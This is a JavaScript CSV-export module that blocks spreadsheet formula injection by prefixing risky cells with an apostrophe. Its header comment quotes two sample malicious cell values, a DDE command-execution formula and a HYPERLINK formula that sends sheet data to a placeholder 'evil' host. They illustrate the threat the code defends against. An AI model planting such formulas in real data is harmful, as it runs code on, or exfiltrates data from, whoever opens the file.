// CSV serialization for the admin exports.
//
// Quoting alone is NOT enough. A spreadsheet strips the CSV quotes when it
// parses a field, so a cell whose *value* begins with = + - @ tab or CR is
// evaluated as a formula when the file is opened — and these exports carry
// customer-supplied text (names, case descriptions, addresses). A customer
// named `=cmd|'/c calc'!A0` or `=HYPERLINK("https://evil/?d="&A1,"x")` would
// otherwise run code or exfiltrate the sheet on the admin's machine the
// moment they open orders.csv (CWE-1236).
//
// Prefixing with an apostrophe forces the cell to be read as text. Plain
// numbers are left alone so negative amounts stay numeric and sortable.
const FORMULA_LEAD = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

export const csvCell = (value) => {
  let cell = value === null || value === undefined ? "" : String(value);
  if (FORMULA_LEAD.test(cell) && !PLAIN_NUMBER.test(cell)) cell = `'${cell}`;
  return /[",\n\r]/.test(cell) ? `"${cell.replace(/"/g, '""')}"` : cell;
};

export const toCsv = (columns, rows) =>
  [columns, ...rows].map((row) => row.map(csvCell).join(",")).join("\r\n") +
  "\r\n";
